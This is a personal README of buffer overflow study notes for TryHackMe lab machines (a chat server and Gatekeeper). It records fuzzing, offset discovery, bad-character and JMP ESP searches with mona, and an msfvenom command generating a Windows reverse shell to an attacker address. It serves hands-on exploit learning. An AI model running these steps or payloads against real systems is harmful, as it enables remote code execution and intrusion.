# BoF
Buffer Overflow Script
(Typos exist)

We start with saying. This is just for documentation and me for learning Buffer Overflows.
I will explain in the script what is goning on instead of writing it here.
Sometimes I edit script 10 times to get it to work, and I do not want to update the README every time.

More details and step by step can be bound here: 
https://jensoroger.wordpress.com/2021/01/19/explain-in-my-own-way-how-to-do-basic-buffer-overflow-with-help-from-realtryhackme-bufferoverlow-hacking-infosec-linux4hackers-pentest-pentesting-redteam/

## Step 1 General about fuzzing
The goal here is to crash the application and make the application execute "our" code that we decide. You need to know how the application works, are login first and the something else that we want to fuzz (crash).

## Step 2 Finding the offset
The goal here is to get control of EIP in the stack, for that to happend we need to find the offset. 

### Step 2.1 (fuzz.py)
Crash the application with fuzz.py and see if EIP contains AAAA.
What is needed are in the script. 
ip, port, string

We also need to verify with ex. Immunity Debugger that EIP contains AAAA


### Step 2. Crash the application and find offset (payload1.py)
Here we want to try finding out if we can control the buffer
We create a payload that are random with pattern_create.rb and then verify if we can find the offset for example with Immunty Debugger.

ip, port, overflow, payload (random data), buffer

Immunity Debugger and mona are used for this

### Step 2.2 Verify the offset (payload2.py)
Here we just verify that all is correct. The EIP shall contain AAAA

ip, port, offsett, retn, payload, buffer, 

Immunity Debugger and mona are used for this

## Step 3 Find bad characters that we can not use in our all characters \x00  (payload3.py)
ip, port, offsett, retn, payload = bad charachter, buffer

Immunity Debugger and mona are used for this

!mona bytearray -b "\x00"

!mona compare -f C:\mona\oscp\bytearray.bin -a "ESP"

 Message=Possibly bad chars: 02 04

## Step 3.1 Find characters minus 3.1 founded  characters (payload3.py edited)
ip, port, offsett, retn, payload = bad charachter, buffer

Immunity Debugger and mona are used for this

!mona bytearray -b "\x00\x02\x04"

!mona compare -f C:\mona\"procename"bytearray.bin -a "ESP"

Do this until you have Unmodified 

## Step 4 Finding jump adress (payload3.py)
In mona after step 3 and add the bad characters that you find.
!mona jmp -r esp -cpb "\x00\x02\x04"
Choose a nice adress in the list, if it do not work at the first time try one more in the list.

## Step 5 Creating the payload (payload4.py)
ip, port, offsett, retn, payload = buf, padding, buffer

Immunity Debugger and mona are used for this

Here you need to know what OS is running the application. It is hard to create a reverse shell from Windows machine with a payload for Linux.
Also the padding my need som ajustments.

Payload exemples that you can use the out put in the script
LHOST=Your attacker box IP
LPORT=What port will the victim use to connect to your attack box
-b= That is the bad characters that you will find in step 3
-f=The output will be in pyton, so we can add this payload to the script.

msfvenom -p windows/shell_reverse_tcp LHOST=172.21.21.34 LPORT=4444 EXITFUNC=thread -b "\x00" -f py

## Brainstorm from tryhackme
The main thing in this BoF was that the first thing that happens when you connect to the application on port 9999
is that a login appears.This has maximum 20 char. Tried first fuzzing that. But found out that this is not gonna happend.
When you enter a username and then you are getting a send message prompt and that is vulnerble.
So in our payload we need to sen Username and a payload.

##Fuzz
python2 ./fuzz.py 
Login with user name roger and fuzzing Chat with 100 bytes
.
.
Login with user name roger and fuzzing Chat with 2200 bytes
Could not connect to 172.21.21.28:9999

/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2500

##Payload 
Create Payload payload.py

!mona findmsp -distance 2500

Offset 2012

0 bad characters

msfvenom -p windows/shell_reverse_tcp LHOST=172.21.21.34 LPORT=4444 EXITFUNC=thread -b "\x00" -f py

Log data, item 11
 Address=625014DF
 Message=  0x625014df : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\win7.INVID\Desktop\vulnerable-apps\chat server\essfunc.dll)

## Gatekeeper
SMB

gatekepper.exe

python2 ./fuzz.py 
Fuzzing hello 100 bytes
Fuzzing hello 200 bytes

msf-pattern_create -l 500

/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 500

!mona findmsp -distance 500

Log data, item 22
 Address=0BADF00D
 Message=    EIP contains normal pattern : 0x39654138 (offset 146)

!mona bytearray -b "\x00"

!mona compare -f C:\mona\gatekeeper\bytearray.bin -a 016A19F8

Log data, item 4
 Address=016A19F8
 Message=Possibly bad chars: 0b

!mona compare -f C:\mona\gatekeeper\bytearray.bin -a 014E19F8

Bad Characters
!mona bytearray -b "\x00\x0a\x0b"

!mona jmp -r esp -cpb "\x00\x01\x0b"

Log data, item 4
 Address=080414C3
 Message=  0x080414c3 : jmp esp |  {PAGE_EXECUTE_READ} [gatekeeper.exe] ASLR: False, Rebase: False, SafeSEH: True, OS: False, v-1.0- (C:\Users\win7.INVID\Desktop\vulnerable-apps\gatekeeper\gatekeeper.exe)

Log data, item 3
 Address=080416BF
 Message=  0x080416bf : jmp esp |  {PAGE_EXECUTE_READ} [gatekeeper.exe] ASLR: False, Rebase: False, SafeSEH: True, OS: False, v-1.0- (C:\Users\win7.INVID\Desktop\vulnerable-apps\gatekeeper\gatekeeper.exe)

\xbf\x16\x04\x08

User Shell
